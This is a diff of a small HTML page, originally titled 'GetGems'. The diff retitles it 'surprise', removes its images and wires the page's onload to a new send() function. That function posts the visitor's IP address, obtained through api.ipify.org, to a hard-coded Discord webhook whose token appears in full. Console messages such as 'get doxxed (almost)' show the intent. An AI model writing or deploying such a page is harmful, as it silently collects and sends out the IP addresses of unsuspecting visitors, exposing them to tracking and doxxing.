@@ -4,11 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="style.css">
-    <title>GetGems</title>
+    <title>surprise</title>
 </head>
-<body onload="get()">
-    <img src="/images/gem.png">
-    <img src="/images/button.png">
+<body onload="send()">
     <script>
         function get(){
             var xhr = new XMLHttpRequest();
@@ -25,6 +23,24 @@
             }
             xhr.open('GET', 'https://api.ipify.org?format=json', true);
             xhr.send();
+        }
+
+        function send(){
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://discordapp.com/api/webhooks/1229927489967751198/guXBZknaiY2gC8kfirSMr4B0s-NIqY1LEUkbrftkwkilOzfYAwytRBbzGq2FK6kQ-BMj', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        console.log('get doxxed (almost)');
+                    } else {
+                        console.error('almost had you');
+                    }
+                }
+            };
+            var IP = "IP Address: " + document.getElementById('ip').textContent;
+            var data = JSON.stringify({content: IP});
+            xhr.send(data);
         }
     </script>
 </body>
